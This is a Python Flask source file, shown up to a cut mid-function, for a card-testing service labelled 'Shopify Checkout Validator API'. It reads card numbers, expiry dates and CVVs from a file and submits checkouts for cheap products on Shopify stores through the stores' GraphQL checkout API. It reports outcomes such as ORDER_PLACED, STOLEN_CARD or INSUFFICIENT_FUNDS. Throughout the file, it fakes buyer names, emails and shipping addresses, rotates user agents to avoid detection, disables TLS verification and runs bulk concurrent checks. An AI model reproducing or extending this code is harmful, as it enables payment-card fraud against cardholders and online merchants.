"""
Shopify Checkout Validator API — Advanced Edition
Validates cards against Shopify stores with products under configurable price.
Uses cards from cards.txt, the scraped site URL, and returns standardized responses:
  CARD_DECLINED, 3DS_REQUIRED, ORDER_PLACED, INVALID_CVC, INSUFFICIENT_FUNDS,
  EXPIRED_CARD, DO_NOT_HONOR, STOLEN_CARD, PICKUP_CARD, RATE_LIMITED, etc.

Improvements over v1:
  - Global async event loop (no per-request loop creation)
  - Persistent aiohttp connection pool (reusable TCP connections)
  - Semaphore-based concurrency control for VPS stability
  - TTL cache for product lookups (avoid re-scraping same site)
  - Retry with exponential backoff for transient errors
  - User-Agent rotation pool
  - Extended address book (15+ countries)
  - Bulk endpoint (/shopify/bulk) for batch card checking
  - Enhanced health endpoint with live stats
  - Environment variable config (MAX_CONCURRENT, MAX_PRICE, PORT, etc.)
  - Structured logging
  - Gunicorn / production ready
"""

import asyncio
import aiohttp
import json
import re
import random
import time
import os
import threading
import logging
from collections import OrderedDict
from urllib.parse import urlparse

from flask import Flask, request, jsonify


# ---------------------------------------------------------------------------
# Configuration (all overridable via environment variables)
# ---------------------------------------------------------------------------
MAX_PRODUCT_PRICE = float(os.environ.get("MAX_PRICE", "8.00"))
MAX_CONCURRENT = int(os.environ.get("MAX_CONCURRENT", "50"))
RETRY_ATTEMPTS = int(os.environ.get("RETRY_ATTEMPTS", "3"))
PRODUCT_CACHE_TTL = int(os.environ.get("PRODUCT_CACHE_TTL", "300"))  # seconds
PRODUCT_CACHE_SIZE = int(os.environ.get("PRODUCT_CACHE_SIZE", "200"))
CARDS_FILE = os.environ.get("CARDS_FILE", "cards.txt")
API_PORT = int(os.environ.get("PORT", "5000"))
CONN_POOL_LIMIT = int(os.environ.get("CONN_POOL_LIMIT", "200"))
REQUEST_TIMEOUT = int(os.environ.get("REQUEST_TIMEOUT", "30"))
LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO").upper()

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("shopify-api")

# ---------------------------------------------------------------------------
# GraphQL Queries / Mutations (unchanged from original)
# ---------------------------------------------------------------------------

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}__typename}warnings{code localizedMessage __typename}serverErrors{code localizedMessage __typename}__typename}__typename}}fragment BuyerProposalDetails on BuyerProposal{...ProposalDetails delivery{...on FilledDeliveryTerms{deliveryLines{deliveryStrategy{handle __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on Proposal{merchandiseDiscount{...DiscountDetails __typename}deliveryDiscount{...DiscountDetails __typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{progressiveRatesEstimatedTimeInTransit deliveryLines{availableDeliveryStrategies{title handle custom acceptsInstructions phoneRequired deliveryStrategyBreakdown{amount{presentmentMoney{amount currencyCode __typename}__typename}discountRecurringCycleLimit targetMerchLines{stableId __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}estimatedTimeInTransit{lower{bound{value boundType __typename}__typename}upper{bound{value boundType __typename}__typename}__typename}__typename}destination{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}...on PickupPoint{name address{address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}__typename}deliveryStrategy{handle title description methodType pickupLocation{...on PickupLocationLegacy{id name __typename}...on PickupInStoreLocation{id name __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalDutyAmount{value{amount currencyCode __typename}__typename}totalAmountIncludedInTarget{value{amount currencyCode __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{paymentMethodIdentifier ...on DirectPaymentMethod{paymentMethodIdentifier __typename}...on GiftCardPaymentMethod{paymentMethodIdentifier __typename}...on WalletsPlatformConfiguration{name __typename}...on ManualPaymentMethod{paymentMethodIdentifier name additionalContent __typename}...on WalletPaymentMethod{paymentMethodIdentifier name __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{address1 address2 city countryCode zoneCode postalCode __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name additionalContent paymentInstructions{header subHeader link label __typename}__typename}...on CustomPaymentMethod{paymentMethodIdentifier name additionalContent __typename}...on PaymentOnDeliveryMethod{paymentMethodIdentifier name additionalContent paymentInstructions{header subHeader link label __typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName additionalContent paymentInstructions{header subHeader link label __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}fragment DiscountDetails on DiscountTerms{...on FilledDiscountTerms{lines{deliveryAllocations{amount{value{amount currencyCode __typename}__typename}__typename}allocations{amount{value{amount currencyCode __typename}__typename}__typename}discount{...on AutomaticDiscount{presentmentTitle __typename}...on CodeDiscount{code presentmentTitle __typename}__typename}lineAmount{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{__typename}...on UnavailableTerms{__typename}__typename}"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}__typename}warnings{code localizedMessage __typename}serverErrors{code localizedMessage __typename}__typename}__typename}}fragment BuyerProposalDetails on BuyerProposal{...ProposalDetails delivery{...on FilledDeliveryTerms{deliveryLines{deliveryStrategy{handle __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on Proposal{merchandiseDiscount{...DiscountDetails __typename}deliveryDiscount{...DiscountDetails __typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{progressiveRatesEstimatedTimeInTransit deliveryLines{availableDeliveryStrategies{title handle custom acceptsInstructions phoneRequired deliveryStrategyBreakdown{amount{presentmentMoney{amount currencyCode __typename}__typename}discountRecurringCycleLimit targetMerchLines{stableId __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}estimatedTimeInTransit{lower{bound{value boundType __typename}__typename}upper{bound{value boundType __typename}__typename}__typename}__typename}destination{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}...on PickupPoint{name address{address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}__typename}deliveryStrategy{handle title description methodType pickupLocation{...on PickupLocationLegacy{id name __typename}...on PickupInStoreLocation{id name __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalDutyAmount{value{amount currencyCode __typename}__typename}totalAmountIncludedInTarget{value{amount currencyCode __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{paymentMethodIdentifier ...on DirectPaymentMethod{paymentMethodIdentifier __typename}...on GiftCardPaymentMethod{paymentMethodIdentifier __typename}...on WalletsPlatformConfiguration{name __typename}...on ManualPaymentMethod{paymentMethodIdentifier name additionalContent __typename}...on WalletPaymentMethod{paymentMethodIdentifier name __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{address1 address2 city countryCode zoneCode postalCode __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name additionalContent paymentInstructions{header subHeader link label __typename}__typename}...on CustomPaymentMethod{paymentMethodIdentifier name additionalContent __typename}...on PaymentOnDeliveryMethod{paymentMethodIdentifier name additionalContent paymentInstructions{header subHeader link label __typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName additionalContent paymentInstructions{header subHeader link label __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}fragment DiscountDetails on DiscountTerms{...on FilledDiscountTerms{lines{deliveryAllocations{amount{value{amount currencyCode __typename}__typename}__typename}allocations{amount{value{amount currencyCode __typename}__typename}__typename}discount{...on AutomaticDiscount{presentmentTitle __typename}...on CodeDiscount{code presentmentTitle __typename}__typename}lineAmount{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{__typename}...on UnavailableTerms{__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on PaymentFailed{code messageUntranslated hasOffsiteRedirect __typename}__typename}__typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on PaymentFailed{code messageUntranslated hasOffsiteRedirect __typename}__typename}__typename}__typename}fragment BuyerProposalDetails on BuyerProposal{...ProposalDetails delivery{...on FilledDeliveryTerms{deliveryLines{deliveryStrategy{handle __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on Proposal{merchandiseDiscount{...DiscountDetails __typename}deliveryDiscount{...DiscountDetails __typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{progressiveRatesEstimatedTimeInTransit deliveryLines{availableDeliveryStrategies{title handle custom acceptsInstructions phoneRequired deliveryStrategyBreakdown{amount{presentmentMoney{amount currencyCode __typename}__typename}discountRecurringCycleLimit targetMerchLines{stableId __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}estimatedTimeInTransit{lower{bound{value boundType __typename}__typename}upper{bound{value boundType __typename}__typename}__typename}__typename}destination{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}...on PickupPoint{name address{address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}__typename}deliveryStrategy{handle title description methodType pickupLocation{...on PickupLocationLegacy{id name __typename}...on PickupInStoreLocation{id name __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalDutyAmount{value{amount currencyCode __typename}__typename}totalAmountIncludedInTarget{value{amount currencyCode __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{paymentMethodIdentifier ...on DirectPaymentMethod{paymentMethodIdentifier __typename}...on GiftCardPaymentMethod{paymentMethodIdentifier __typename}...on WalletsPlatformConfiguration{name __typename}...on ManualPaymentMethod{paymentMethodIdentifier name additionalContent __typename}...on WalletPaymentMethod{paymentMethodIdentifier name __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{address1 address2 city countryCode zoneCode postalCode __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name additionalContent paymentInstructions{header subHeader link label __typename}__typename}...on CustomPaymentMethod{paymentMethodIdentifier name additionalContent __typename}...on PaymentOnDeliveryMethod{paymentMethodIdentifier name additionalContent paymentInstructions{header subHeader link label __typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName additionalContent paymentInstructions{header subHeader link label __typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}fragment DiscountDetails on DiscountTerms{...on FilledDiscountTerms{lines{deliveryAllocations{amount{value{amount currencyCode __typename}__typename}__typename}allocations{amount{value{amount currencyCode __typename}__typename}__typename}discount{...on AutomaticDiscount{presentmentTitle __typename}...on CodeDiscount{code presentmentTitle __typename}__typename}lineAmount{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{__typename}...on UnavailableTerms{__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on PaymentFailed{code messageUntranslated hasOffsiteRedirect __typename}__typename}__typename}__typename}"""

# ---------------------------------------------------------------------------
# Currency → Country mapping (extended)
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "JPY": "JP", "SGD": "SG", "NZD": "NZ",
    "MXN": "MX", "BRL": "BR", "ZAR": "ZA", "SEK": "SE",
    "NOK": "NO", "DKK": "DK", "PLN": "PL", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "KRW": "KR", "TWD": "TW",
    "TRY": "TR", "SAR": "SA", "QAR": "QA", "KWD": "KW",
    "ILS": "IL", "CLP": "CL", "COP": "CO", "PEN": "PE",
    "ARS": "AR",
}

# ---------------------------------------------------------------------------
# Address book (extended — 20+ countries)
# ---------------------------------------------------------------------------
ADDRESS_BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Blvd", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Rd", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Friedrichstr. 43", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "12 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "countryCode": "FR", "phone": "142345678"},
    "JP": {"address1": "1-1 Marunouchi", "city": "Chiyoda-ku", "postalCode": "100-0005", "zoneCode": "JP-13", "countryCode": "JP", "phone": "312345678"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "", "countryCode": "SG", "phone": "61234567"},
    "NZ": {"address1": "1 Queen St", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "91234567"},
    "MX": {"address1": "Av. Reforma 222", "city": "Mexico City", "postalCode": "06600", "zoneCode": "CMX", "countryCode": "MX", "phone": "5512345678"},
    "BR": {"address1": "Av. Paulista 1578", "city": "Sao Paulo", "postalCode": "01310-200", "zoneCode": "SP", "countryCode": "BR", "phone": "11987654321"},
    "SE": {"address1": "Drottninggatan 53", "city": "Stockholm", "postalCode": "111 21", "zoneCode": "AB", "countryCode": "SE", "phone": "812345678"},
    "NO": {"address1": "Karl Johans gate 22", "city": "Oslo", "postalCode": "0159", "zoneCode": "03", "countryCode": "NO", "phone": "22345678"},
    "DK": {"address1": "Stroget 12", "city": "Copenhagen", "postalCode": "1000", "zoneCode": "84", "countryCode": "DK", "phone": "31234567"},
    "IT": {"address1": "Via Roma 1", "city": "Rome", "postalCode": "00187", "zoneCode": "RM", "countryCode": "IT", "phone": "612345678"},
    "ES": {"address1": "Gran Via 32", "city": "Madrid", "postalCode": "28013", "zoneCode": "M", "countryCode": "ES", "phone": "612345678"},
    "SA": {"address1": "King Fahd Rd", "city": "Riyadh", "postalCode": "11564", "zoneCode": "01", "countryCode": "SA", "phone": "501234567"},
    "TR": {"address1": "Istiklal Caddesi 10", "city": "Istanbul", "postalCode": "34433", "zoneCode": "34", "countryCode": "TR", "phone": "5301234567"},
    "PL": {"address1": "ul. Marszalkowska 1", "city": "Warsaw", "postalCode": "00-001", "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"},
    "MY": {"address1": "Jalan Bukit Bintang", "city": "Kuala Lumpur", "postalCode": "55100", "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia",
    "Jennifer", "Linda", "Elizabeth", "Sarah", "Thomas", "Charles", "Daniel",
    "Matthew", "Anthony", "Mark", "Andrew", "Joshua", "Emily", "Jessica",
    "Ashley", "Sophia", "Olivia", "Emma", "Isabella", "Mia", "Charlotte",
    "Alexander", "Benjamin", "Ethan", "Henry", "Sebastian", "Jack", "Aiden",
    "Owen", "Samuel", "Ryan", "Nathan", "Adrian", "Brandon", "Austin",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Rodriguez", "Martinez", "Anderson", "Taylor", "Thomas", "Moore",
    "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris",
    "Clark", "Lewis", "Robinson", "Walker", "Young", "King", "Wright",
    "Hill", "Scott", "Green", "Adams", "Baker", "Nelson", "Carter",
]
EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "protonmail.com",
    "hotmail.com", "icloud.com", "aol.com", "mail.com",
    "zoho.com", "yandex.com", "fastmail.com",
]

# ---------------------------------------------------------------------------
# User-Agent rotation pool
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.6998.165 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36 Edg/136.0.3240.64",
]

# ---------------------------------------------------------------------------
# Global state — shared event loop, connection pool, semaphore, stats
# ---------------------------------------------------------------------------
_loop = None
_loop_thread = None
_session_pool = None
_semaphore = None
_stats = {
    "total_requests": 0,
    "active_requests": 0,
    "total_success": 0,
    "total_declined": 0,
    "total_3ds": 0,
    "total_errors": 0,
    "start_time": time.time(),
}
_stats_lock = threading.Lock()


class TTLCache:
    """Thread-safe TTL cache with max-size eviction."""

    def __init__(self, maxsize=200, ttl=300):
        self._cache = OrderedDict()
        self._maxsize = maxsize
        self._ttl = ttl
        self._lock = threading.Lock()

    def get(self, key):
        with self._lock:
            if key not in self._cache:
                return None
            value, ts = self._cache[key]
            if time.time() - ts > self._ttl:
                del self._cache[key]
                return None
            self._cache.move_to_end(key)
            return value

    def put(self, key, value):
        with self._lock:
            if key in self._cache:
                del self._cache[key]
            elif len(self._cache) >= self._maxsize:
                self._cache.popitem(last=False)
            self._cache[key] = (value, time.time())

    def clear(self):
        with self._lock:
            self._cache.clear()

    @property
    def size(self):
        with self._lock:
            return len(self._cache)


_product_cache = TTLCache(maxsize=PRODUCT_CACHE_SIZE, ttl=PRODUCT_CACHE_TTL)


def _start_background_loop():
    """Start a persistent event loop in a background daemon thread."""
    global _loop, _loop_thread
    _loop = asyncio.new_event_loop()

    def _run():
        asyncio.set_event_loop(_loop)
        _loop.run_forever()

    _loop_thread = threading.Thread(target=_run, daemon=True)
    _loop_thread.start()


def _run_async(coro):
    """Submit a coroutine to the shared loop, block until done."""
    if _loop is None or not _loop.is_running():
        _start_background_loop()
    future = asyncio.run_coroutine_threadsafe(coro, _loop)
    return future.result()


async def _get_session():
    """Get or create a global aiohttp session with connection pooling."""
    global _session_pool
    if _session_pool is None or _session_pool.closed:
        connector = aiohttp.TCPConnector(
            limit=CONN_POOL_LIMIT,
            limit_per_host=30,
            ssl=False,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _session_pool = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _session_pool


async def _get_semaphore():
    """Get or create the global concurrency semaphore."""
    global _semaphore
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    return _semaphore


def _update_stats(key, delta=1):
    with _stats_lock:
        _stats[key] = _stats.get(key, 0) + delta


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def load_cards(filepath=CARDS_FILE):
    cards = []
    if not os.path.exists(filepath):
        return cards
    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split("|")
            if len(parts) == 4:
                cards.append({
                    "cc": parts[0].strip(),
                    "month": parts[1].strip(),
                    "year": parts[2].strip(),
                    "cvv": parts[3].strip(),
                })
    return cards


def get_random_card(cards=None):
    if cards is None:
        cards = load_cards()
    if not cards:
        return None
    return random.choice(cards)


def pick_address(url, currency=None):
    dom = urlparse(url).netloc
    tld = dom.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
